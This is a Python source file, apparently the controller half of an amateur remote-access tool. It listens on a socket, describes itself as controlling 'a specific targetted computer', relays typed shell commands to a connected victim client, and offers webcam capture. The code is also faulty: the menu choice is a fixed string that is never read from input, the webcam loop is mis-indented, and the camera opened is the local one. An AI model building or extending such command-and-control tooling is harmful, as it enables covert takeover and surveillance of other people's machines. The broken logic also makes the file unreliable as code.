#Import
import sys
import socket
import numpy as np
import cv2 as cv

#Server and Client
SERVER_IP = "127.0.0.1"
PORT = 8080

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))
s.listen(1)

print(">>> You have now enter the Server, where you can controll the P.C. of a specific targetted computer")
decision = (">>> press '1' if you want to continue, press '2' if you want to exit: ")

if decision == "1":

    while True:
        print(f">>> listening as {SERVER_IP}:{PORT}")
        client = s.accept()
        print(f">>> client connected {client[1]}")
        client[0].send("connected".encode())

        print(">>> Type '1' if you want to open the fotocamera")
        print("    Type '2' if you want to use the command prompt (C.M.D.)")
        d = input(">>>")

        if d == "1":

            cap = cv.VideoCapture(0)
            fourcc = cv.VideoWriter_fourcc(*'XVID')
            out = cv.VideoWriter('output.avi', fourcc, 20.0, (640, 480))

            while cap.isOpened():
                ret, frame = cap.read()
                
                if not ret:
                    
                    print(">>> Can't get the Output from the VideoCamera...")
                    break
            
            frame = cv.flip(frame, 0)
            
            out.write(frame)
            cv.imshow('frame', frame)
            
            if cv.waitKey(1) == ord('q'):
                break

            cap.release()
            out.release()
            cv.destroyAllWindows()
        
        if d == "2":
        
            while True:

                cmd = input(">>> ")
                client[0].send(cmd.encode())

                if cmd.lower() in ["quit", "exit", "q", "x"]:
                    break
                result = client[0].recv(1024).decode()
                print(result)

            client[0].close()
            cmd = input("Wait for new client? 'yes' or 'no': ")
            if cmd.lower() in ["n", "no"]:
                break

else:
    
    print(">>> Thanks for using our Server, Goodbye")

s.close()
